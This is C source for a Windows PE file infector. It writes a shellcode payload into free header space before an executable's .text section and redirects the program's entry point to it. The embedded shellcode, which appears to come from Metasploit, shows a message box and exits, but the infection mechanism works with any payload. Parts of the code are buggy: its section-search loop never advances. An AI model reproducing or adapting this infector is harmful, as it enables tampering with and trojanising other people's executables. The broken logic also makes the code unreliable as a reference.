/* Simple Pe Infector By _antony (c) http://sav1or.name*/
/* infecting method:
find a free space in pe header;
how it works?
we find PointerToRawData of .text section because system loader put's her first
then we use my simple formulation :
delta = PointerToRawData - sizeof(code) and scan this space of memmory if it's free infect file and
change OEP to delta.
may be it will be more correct to use
delta = PointerToRawData - (sizeof(code) + some more)

*/
/* iamge presentation
------------------
| PE HEADER |
|________________|
| |
| |
| OBJECT TABLE |
|________________|
| |
| |
| FREE SPACE |
| our code |
|________________|
| |
|.text section |
| next section |
| next section |
| .............. |
| |
------------------
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>

int getTextSectionOffset(PIMAGE_SECTION_HEADER pSectionHeader , int NumberOfSections)
{
    while(NumberOfSections > 0)
    {
        if( !strcmp((char*)pSectionHeader->Name , ".text"))
        {
            return pSectionHeader->PointerToRawData;
        }
    }
    /* we did not find .text section */
    return 0;
}

/* entry point */
int main(int argc , char *argv[])
{
    HANDLE hFile;
    HANDLE hMap;
    char *MappedFile = 0;
    DWORD FileSize; /* file size */
    DWORD delta;
    DWORD SectionOffset; /* .text section offset*/
    DWORD func_addr;
    IMAGE_DOS_HEADER *pDosHeader;
    IMAGE_NT_HEADERS *pNtHeader;
    IMAGE_SECTION_HEADER *pSecHeader;
    /* shell code*/
    //char code[] = "\x6A\x00" /*push 0 */
    //              "\xB8\x00\x00\x00\x00" /*mov eax , func_addr (address will be inserted automaticly)*/
    //              "\xFF\xD0"; /*call eax */
    char code[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55"
        "\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8"
        "\x61\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67\x65\x42"
        "\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68"
        "\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
        "\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c"
        "\x24\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0"
        "\x50\xff\x55\x08";


    if(argc < 2)
    {
        printf("parameters : ssv.exe [filename]\r\n");
        printf("simple pe infector by _antony\r\n");
        return 0;
    }
    printf("target: [%s] \n" , argv[1]);
    /* open file */
    hFile = CreateFile(argv[1] ,
                       GENERIC_WRITE | GENERIC_READ ,
                       0 ,
                       0 ,
                       OPEN_EXISTING ,
                       FILE_ATTRIBUTE_NORMAL ,
                       0);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        printf("[Error]: Can't open File! Error code : %lu" , GetLastError());
        return -1;
    }
    /* get file size */
    FileSize = GetFileSize(hFile , 0 );
    printf("[File Size ]: %lu \n", FileSize);
    /* mapping file */
    hMap = CreateFileMapping(hFile ,
                             0 ,
                             PAGE_READWRITE,
                             0 ,
                             FileSize ,
                             0);
    if(hMap == INVALID_HANDLE_VALUE)
    {
        printf("[Error]: Can't map file! Error code: %lu\n" , GetLastError());
        CloseHandle(hFile);
        return -1;
    }
    printf("file mapped\n");
    MappedFile = (char*)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , FileSize);
    if(MappedFile == NULL)
    {
        printf("[Error]: Can't map file! Error code %lu\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hMap);
        UnmapViewOfFile(MappedFile);
        return -1;
    }
    pDosHeader = (IMAGE_DOS_HEADER*)MappedFile;
    pNtHeader = (IMAGE_NT_HEADERS*)((DWORD)MappedFile + pDosHeader->e_lfanew);
    pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);
    /* get .text section PointerToRawData*/
    SectionOffset = getTextSectionOffset(pSecHeader , pNtHeader->FileHeader.NumberOfSections);
    if(SectionOffset == 0)
    {
        printf("[Error]: Can't find .text section!\n");
        CloseHandle(hFile);
        CloseHandle(hMap);
        UnmapViewOfFile(MappedFile);
        return -1;
    }
    delta = SectionOffset - sizeof(code);
    int i;
    BYTE check;
    printf("scanning...\n");
    /* scanning space if there are only 00 then we infect file */
    for(i=0 ; i<sizeof(code) ; i++)
    {
        check = *((BYTE*)MappedFile + delta + i);
        printf("%X \t", check);
        if(check != 0)
        {
            printf("There is some data...\n");
            CloseHandle(hFile);
            CloseHandle(hMap);
            UnmapViewOfFile(MappedFile);
            return -1;
        }
    }
    printf("Space if free , infecting File...\n");
    /* insert function address in shell code */
    func_addr = (DWORD)GetProcAddress( LoadLibrary("kernel32.dll") , "ExitProcess");
    for(i=0 ; i < sizeof(code) ; i++ )
    {
        if( *(DWORD*)&code[i] == 0x00000B8)
        {
            *(DWORD*)(code+i+1)= func_addr;
        }
    }
    printf("Old Entry Point : %08X \n" , (unsigned int) pNtHeader->OptionalHeader.AddressOfEntryPoint);
    memcpy(MappedFile+delta , code , sizeof(code));
    /* new entry point */
    pNtHeader->OptionalHeader.AddressOfEntryPoint = delta;
    printf("File infected!\n");
    printf("New Entry Point: %08X \n" , (unsigned int) delta);
    CloseHandle(hFile);
    CloseHandle(hMap);
    UnmapViewOfFile(MappedFile);
    return 0;
}
